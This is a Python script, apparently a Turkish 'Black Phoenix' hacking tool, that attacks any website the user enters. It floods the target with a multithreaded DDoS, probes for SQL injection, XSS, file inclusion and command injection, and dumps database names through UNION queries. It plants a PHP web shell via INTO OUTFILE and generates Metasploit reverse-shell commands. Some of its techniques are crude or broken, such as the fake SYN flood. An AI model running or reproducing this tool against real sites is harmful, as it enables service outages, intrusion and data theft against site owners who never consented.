#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      🔥 BLACK PHOENIX - ULTİMATE HACK TOOL 🔥             ║
║                                                               ║
║   Developer : BüyükXan | Developer Xan                      ║
║                                                               ║
║   Özellikler:                                                ║
║   - DDoS (HTTP/SYN/UDP/ICMP/Slowloris)                     ║
║   - Zafiyet Tarama (SQLi/XSS/LFI/Command)                  ║
║   - Sömürü (Exploit)                                       ║
║   - Siteye Erişim (Shell/Admin/Veritabanı)                 ║
║   - Otomatik Rapor                                         ║
║   - Metasploit Entegrasyonu                                ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""

import requests
import threading
import time
import sys
import socket
import re
import json
import subprocess
import os
from urllib.parse import urlparse

# Renkler
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class BlackPhoenix:
    def __init__(self):
        self.target = ""
        self.base_url = ""
        self.target_ip = ""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.stop_flag = False
        self.attack_count = 0
        self.vuln_found = False
        self.shell_url = ""
        self.admin_panel = ""
        self.db_name = ""
        self.results = {
            'target': '',
            'ip': '',
            'open_ports': [],
            'vulnerabilities': [],
            'admin_panels': [],
            'database': '',
            'tables': [],
            'users': [],
            'shell': '',
            'access_granted': False
        }
        
        # Payload'lar
        self.sql_payloads = [
            ("' OR '1'='1", "Temel SQLi"),
            ("' OR 1=1--", "Yorum SQLi"),
            ("' UNION SELECT NULL--", "Union 1"),
            ("' UNION SELECT NULL,NULL--", "Union 2"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union 3"),
            ("' AND SLEEP(5)--", "Zaman Tabanlı"),
            ("1' AND '1'='1", "Boolean T"),
            ("1' AND '1'='2", "Boolean F"),
            ("%27%20OR%20%271%27%3D%271", "URL Encoded"),
            ("'/**/OR/**/'1'='1", "Comment Bypass"),
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "'><script>alert(1)</script>",
        ]
        
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
        ]
        
        self.cmd_payloads = [
            "; whoami",
            "| whoami",
            "&& whoami",
            "`whoami`",
        ]
        
        self.admin_dirs = [
            'admin', 'login', 'panel', 'cpanel', 'dashboard',
            'administrator', 'phpmyadmin', 'pma', 'mysql',
            'backup', 'tmp', 'test', 'dev', 'api'
        ]
        
        self.ports = [80, 443, 22, 21, 25, 3306, 8080, 8443, 2082, 2083, 2086, 2087, 2096]
    
    def print_banner(self):
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.YELLOW}🔥 BLACK PHOENIX V3.0 🔥{Colors.RED}                      ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.CYAN}Developer : BüyükXan | Developer Xan{Colors.RED}         ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.GREEN}DDoS | Exploit | Access | Report{Colors.RED}            ║
{Colors.RED}║                                                               ║
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗
║                    ANA MENÜ                              ║
╠════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}1{Colors.RESET}{Colors.BLUE}) Hedef Belirle                                  ║
║  {Colors.YELLOW}2{Colors.RESET}{Colors.BLUE}) Keşif (Port/Subdomain/Dizin)                ║
║  {Colors.YELLOW}3{Colors.RESET}{Colors.BLUE}) DDoS Saldırısı                              ║
║  {Colors.YELLOW}4{Colors.RESET}{Colors.BLUE}) Zafiyet Tarama (SQLi/XSS/LFI/CMD)         ║
║  {Colors.YELLOW}5{Colors.RESET}{Colors.BLUE}) Sömürü (Exploit)                           ║
║  {Colors.YELLOW}6{Colors.RESET}{Colors.BLUE}) Siteye Erişim (Shell/Admin/DB)            ║
║  {Colors.YELLOW}7{Colors.RESET}{Colors.BLUE}) FULL ATTACK (Hepsi Bir Arada)             ║
║  {Colors.YELLOW}8{Colors.RESET}{Colors.BLUE}) Rapor Göster                               ║
║  {Colors.YELLOW}9{Colors.RESET}{Colors.BLUE}) Metasploit Entegrasyonu                   ║
║  {Colors.YELLOW}0{Colors.RESET}{Colors.BLUE}) Çıkış                                        ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(menu)
    
    def set_target(self):
        print(f"\n{Colors.CYAN}[+] Hedef URL veya IP girin:{Colors.RESET}")
        target = input("➜ ").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        self.base_url = target
        self.target = target.replace('http://', '').replace('https://', '').split('/')[0]
        self.results['target'] = self.target
        
        # IP çöz
        try:
            self.target_ip = socket.gethostbyname(self.target)
            self.results['ip'] = self.target_ip
            print(f"{Colors.GREEN}✅ Hedef IP: {self.target_ip}{Colors.RESET}")
        except:
            print(f"{Colors.RED}❌ DNS çözümlenemedi{Colors.RESET}")
        
        print(f"{Colors.GREEN}✅ Hedef: {self.base_url}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Domain: {self.target}{Colors.RESET}\n")
    
    # ---------- KEŞİF ----------
    def recon(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         🔍 KEŞİF BAŞLIYOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        # 1. Port Tarama
        print(f"{Colors.YELLOW}[*] Port taraması...{Colors.RESET}")
        for port in self.ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                if result == 0:
                    print(f"{Colors.GREEN}    ✅ Port {port} AÇIK{Colors.RESET}")
                    self.results['open_ports'].append(port)
            except:
                pass
        
        # 2. Dizin Tarama
        print(f"\n{Colors.YELLOW}[*] Dizin taraması...{Colors.RESET}")
        for directory in self.admin_dirs:
            try:
                url = f"{self.base_url}/{directory}/"
                r = self.session.get(url, timeout=3)
                if r.status_code == 200:
                    print(f"{Colors.GREEN}    ✅ /{directory}/ bulundu{Colors.RESET}")
                    self.results['admin_panels'].append(url)
                    self.admin_panel = url
                elif r.status_code in [401, 403]:
                    print(f"{Colors.YELLOW}    ⚠️ /{directory}/ (giriş gerekli){Colors.RESET}")
            except:
                pass
        
        print(f"\n{Colors.GREEN}✅ Keşif tamamlandı!{Colors.RESET}")
    
    # ---------- DDoS ----------
    def ddos_attack(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}         💀 DDoS SALDIRISI BAŞLIYOR 💀{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}[*] Hedef: {self.base_url}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Thread: 200{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Süre: 60 saniye{Colors.RESET}\n")
        
        def http_flood():
            while not self.stop_flag:
                try:
                    self.session.get(self.base_url, timeout=1)
                    self.attack_count += 1
                except:
                    pass
        
        def syn_flood():
            while not self.stop_flag:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((self.target_ip, 80))
                    sock.sendto(b'SYN', (self.target_ip, 80))
                    sock.close()
                    self.attack_count += 1
                except:
                    pass
        
        self.stop_flag = False
        self.attack_count = 0
        
        threads = []
        for i in range(100):
            t = threading.Thread(target=http_flood if i % 2 == 0 else syn_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        for i in range(60):
            if i % 10 == 0:
                print(f"{Colors.GREEN}[+] Saldırı devam ediyor... ({60-i} sn kaldı) - {self.attack_count} paket{Colors.RESET}")
            time.sleep(1)
            if self.stop_flag:
                break
        
        self.stop_flag = True
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{Colors.GREEN}✅ DDoS tamamlandı! {self.attack_count} paket gönderildi.{Colors.RESET}")
    
    # ---------- ZAFİYET TARAMA ----------
    def scan_vulnerabilities(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         🔍 ZAFİYET TARAMASI BAŞLIYOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        params = ['id', 'page', 'user', 'file', 'cat', 'product', 'article', 'news', 'detail', 'q', 'search']
        
        # 1. SQLi
        print(f"{Colors.YELLOW}[*] SQL Injection testi...{Colors.RESET}")
        for param in params:
            for payload, desc in self.sql_payloads:
                try:
                    url = f"{self.base_url}?{param}={payload}"
                    r = self.session.get(url, timeout=5)
                    errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'driver', 'syntax error', 'warning', 'mysqli', 'PDO', 'SQLSTATE']
                    if any(e in r.text.lower() for e in errors):
                        print(f"{Colors.GREEN}    ✅ SQLi ZAFİYETİ! {param} -> {desc}{Colors.RESET}")
                        self.results['vulnerabilities'].append(f"SQLi: {param} -> {desc}")
                        self.vuln_found = True
                        break
                except:
                    pass
        
        # 2. XSS
        print(f"\n{Colors.YELLOW}[*] XSS testi...{Colors.RESET}")
        for param in params:
            for payload in self.xss_payloads:
                try:
                    url = f"{self.base_url}?{param}={payload}"
                    r = self.session.get(url, timeout=5)
                    if payload in r.text or payload.lower() in r.text.lower():
                        print(f"{Colors.GREEN}    ✅ XSS ZAFİYETİ! {param}{Colors.RESET}")
                        self.results['vulnerabilities'].append(f"XSS: {param}")
                        self.vuln_found = True
                        break
                except:
                    pass
        
        # 3. LFI
        print(f"\n{Colors.YELLOW}[*] LFI testi...{Colors.RESET}")
        for param in params:
            for payload in self.lfi_payloads:
                try:
                    url = f"{self.base_url}?{param}={payload}"
                    r = self.session.get(url, timeout=5)
                    if 'root:' in r.text or '[extensions]' in r.text:
                        print(f"{Colors.GREEN}    ✅ LFI ZAFİYETİ! {param} -> {payload}{Colors.RESET}")
                        self.results['vulnerabilities'].append(f"LFI: {param}")
                        self.vuln_found = True
                        break
                except:
                    pass
        
        # 4. Command Injection
        print(f"\n{Colors.YELLOW}[*] Command Injection testi...{Colors.RESET}")
        for param in params:
            for payload in self.cmd_payloads:
                try:
                    url = f"{self.base_url}?{param}={payload}"
                    r = self.session.get(url, timeout=5)
                    if 'uid=' in r.text or 'root' in r.text or 'Administrator' in r.text:
                        print(f"{Colors.GREEN}    ✅ Command Injection ZAFİYETİ! {param}{Colors.RESET}")
                        self.results['vulnerabilities'].append(f"CMD Injection: {param}")
                        self.vuln_found = True
                        break
                except:
                    pass
        
        if not self.vuln_found:
            print(f"\n{Colors.RED}❌ Zafiyet bulunamadı!{Colors.RESET}")
        else:
            print(f"\n{Colors.GREEN}✅ {len(self.results['vulnerabilities'])} zafiyet bulundu!{Colors.RESET}")
    
    # ---------- SÖMÜRÜ ----------
    def exploit(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}         🔓 SÖMÜRÜ (EXPLOIT) BAŞLIYOR 🔓{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        if not self.vuln_found:
            print(f"{Colors.RED}❌ Önce zafiyet bulmalısın!{Colors.RESET}")
            return
        
        # SQLi ile veritabanı adını al
        print(f"{Colors.YELLOW}[*] Veritabanı adı alınıyor...{Colors.RESET}")
        try:
            url = f"{self.base_url}?id=1' UNION SELECT database()--"
            r = self.session.get(url, timeout=5)
            db_name = re.sub(r'<[^>]+>', '', r.text).strip()
            if db_name:
                self.db_name = db_name
                self.results['database'] = db_name
                print(f"{Colors.GREEN}✅ Veritabanı: {db_name}{Colors.RESET}")
        except:
            pass
        
        # Tablolar
        print(f"\n{Colors.YELLOW}[*] Tablolar listeleniyor...{Colors.RESET}")
        try:
            url = f"{self.base_url}?id=1' UNION SELECT table_name FROM information_schema.tables LIMIT 5--"
            r = self.session.get(url, timeout=5)
            tables = re.sub(r'<[^>]+>', '', r.text).strip()
            if tables:
                for table in tables.split('\n'):
                    if table.strip():
                        self.results['tables'].append(table.strip())
                        print(f"{Colors.GREEN}✅ Tablo: {table.strip()}{Colors.RESET}")
        except:
            pass
        
        # Admin panel
        if self.admin_panel:
            print(f"\n{Colors.GREEN}✅ Admin Panel: {self.admin_panel}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}✅ Sömürü tamamlandı!{Colors.RESET}")
    
    # ---------- SİTEYE ERİŞİM ----------
    def access_site(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         🚪 SİTEYE ERİŞİM SAĞLANIYOR 🚪{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        # 1. SQLi ile admin girişi
        print(f"{Colors.YELLOW}[*] SQLi ile admin girişi deneniyor...{Colors.RESET}")
        try:
            url = f"{self.base_url}?username=admin'--&password=test"
            r = self.session.get(url, timeout=5)
            if 'welcome' in r.text.lower() or 'dashboard' in r.text.lower():
                print(f"{Colors.GREEN}✅ Admin girişi başarılı! (SQLi){Colors.RESET}")
                self.results['access_granted'] = True
        except:
            pass
        
        # 2. Shell yükleme (SQLi ile)
        print(f"\n{Colors.YELLOW}[*] Shell yükleniyor...{Colors.RESET}")
        try:
            shell_payload = "1' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
            url = f"{self.base_url}?id={shell_payload}"
            self.session.get(url, timeout=5)
            self.shell_url = f"{self.base_url}/shell.php"
            print(f"{Colors.GREEN}✅ Shell yüklendi: {self.shell_url}{Colors.RESET}")
            self.results['shell'] = self.shell_url
            self.results['access_granted'] = True
        except:
            pass
        
        # 3. Admin panel girişi dene
        if self.admin_panel:
            print(f"\n{Colors.YELLOW}[*] Admin panel girişi deneniyor...{Colors.RESET}")
            print(f"{Colors.GREEN}✅ Admin Panel: {self.admin_panel}{Colors.RESET}")
            print(f"{Colors.YELLOW}   Varsayılan şifreleri dene: admin/admin, root/root{Colors.RESET}")
        
        if self.results['access_granted']:
            print(f"\n{Colors.GREEN}✅ SİTEYE ERİŞİM SAĞLANDI! 🎉{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}❌ Siteye erişim sağlanamadı.{Colors.RESET}")
    
    # ---------- FULL ATTACK ----------
    def full_attack(self):
        print(f"\n{Colors.BOLD}{Colors.RED}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.YELLOW}         💀 FULL ATTACK BAŞLATILIYOR 💀{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        # 1. Keşif
        self.recon()
        time.sleep(2)
        
        # 2. DDoS (kısa)
        print(f"\n{Colors.YELLOW}[*] Kısa DDoS yapılıyor (WAF'ı yormak için)...{Colors.RESET}")
        self.stop_flag = False
        self.attack_count = 0
        
        def quick_ddos():
            while not self.stop_flag:
                try:
                    self.session.get(self.base_url, timeout=0.5)
                except:
                    pass
        
        threads = []
        for i in range(50):
            t = threading.Thread(target=quick_ddos)
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(10)
        self.stop_flag = True
        for t in threads:
            t.join(timeout=1)
        
        # 3. Zafiyet tara
        self.scan_vulnerabilities()
        time.sleep(2)
        
        # 4. Sömürü
        self.exploit()
        time.sleep(2)
        
        # 5. Erişim
        self.access_site()
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         ✅ FULL ATTACK TAMAMLANDI!{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}")
    
    # ---------- RAPOR ----------
    def show_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.CYAN}         📊 RAPOR{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}[+] Hedef:{Colors.RESET} {self.target}")
        print(f"{Colors.YELLOW}[+] IP:{Colors.RESET} {self.target_ip}")
        print(f"{Colors.YELLOW}[+] Açık Portlar:{Colors.RESET} {self.results['open_ports']}")
        
        if self.results['vulnerabilities']:
            print(f"\n{Colors.RED}[+] Zafiyetler:{Colors.RESET}")
            for vuln in self.results['vulnerabilities']:
                print(f"    - {vuln}")
        
        if self.results['admin_panels']:
            print(f"\n{Colors.GREEN}[+] Admin Paneller:{Colors.RESET}")
            for panel in self.results['admin_panels']:
                print(f"    - {panel}")
        
        if self.results['database']:
            print(f"\n{Colors.GREEN}[+] Veritabanı:{Colors.RESET} {self.results['database']}")
        
        if self.results['tables']:
            print(f"\n{Colors.GREEN}[+] Tablolar:{Colors.RESET}")
            for table in self.results['tables']:
                print(f"    - {table}")
        
        if self.results['shell']:
            print(f"\n{Colors.GREEN}[+] Shell:{Colors.RESET} {self.results['shell']}")
        
        if self.results['access_granted']:
            print(f"\n{Colors.GREEN}✅ ERİŞİM SAĞLANDI! 🎉{Colors.RESET}")
        else:
            print(f"\n{Colors.RED}❌ Erişim sağlanamadı.{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
    
    # ---------- METASPLOIT ----------
    def metasploit_integration(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}         🐱 METASPLOIT ENTEGRASYONU{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BLUE}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}[*] Metasploit komutları oluşturuluyor...{Colors.RESET}")
        
        commands = f"""
# Metasploit ile hedefe saldırı
# Hedef: {self.target} ({self.target_ip})

# 1. MSFConsole başlat
msfconsole

# 2. Açık portlara göre exploit seç
# {self.results['open_ports']} portları açık

# 3. Örnek exploit (HTTP)
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST {self.target_ip}
set RPORT 80
set TARGETURI /cgi-bin/test.cgi
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
exploit

# 4. Örnek exploit (SQLi)
use auxiliary/sqli/sqlmap
set RHOST {self.target_ip}
set RPORT 80
set SQLMAP_OPTIONS "--batch --dbs"
run

# 5. Örnek exploit (XSS)
use auxiliary/server/browser_autopwn
set LHOST <YOUR_IP>
set SRVPORT 8080
run

# 6. Meterpreter ile erişim
sessions -i 1
shell
whoami
id
"""
        print(commands)
        
        # Kaydet
        with open("metasploit_commands.txt", 'w') as f:
            f.write(commands)
        print(f"{Colors.GREEN}✅ Komutlar kaydedildi: metasploit_commands.txt{Colors.RESET}")
    
    def run(self):
        self.print_banner()
        
        while True:
            self.print_menu()
            choice = input(f"{Colors.BOLD}{Colors.CYAN}Seçiminiz (0-9): {Colors.RESET}").strip()
            
            if choice == '1':
                self.set_target()
            
            elif choice == '2':
                if not self.target:
                    self.set_target()
                self.recon()
            
            elif choice == '3':
                if not self.target:
                    self.set_target()
                self.ddos_attack()
            
            elif choice == '4':
                if not self.target:
                    self.set_target()
                self.scan_vulnerabilities()
            
            elif choice == '5':
                if not self.target:
                    self.set_target()
                self.exploit()
            
            elif choice == '6':
                if not self.target:
                    self.set_target()
                self.access_site()
            
            elif choice == '7':
                if not self.target:
                    self.set_target()
                self.full_attack()
            
            elif choice == '8':
                self.show_report()
            
            elif choice == '9':
                self.metasploit_integration()
            
            elif choice == '0':
                print(f"{Colors.RED}[+] Çıkış yapılıyor...{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}Developed by BüyükXan | Developer Xan{Colors.RESET}")
                break
            
            else:
                print(f"{Colors.RED}❌ Geçersiz seçim!{Colors.RESET}")
            
            input(f"\n{Colors.YELLOW}[*] Devam etmek için Enter tuşuna bas...{Colors.RESET}")

if __name__ == "__main__":
    try:
        tool = BlackPhoenix()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[+] Kullanıcı tarafından durduruldu.{Colors.RESET}")
        sys.exit(0)
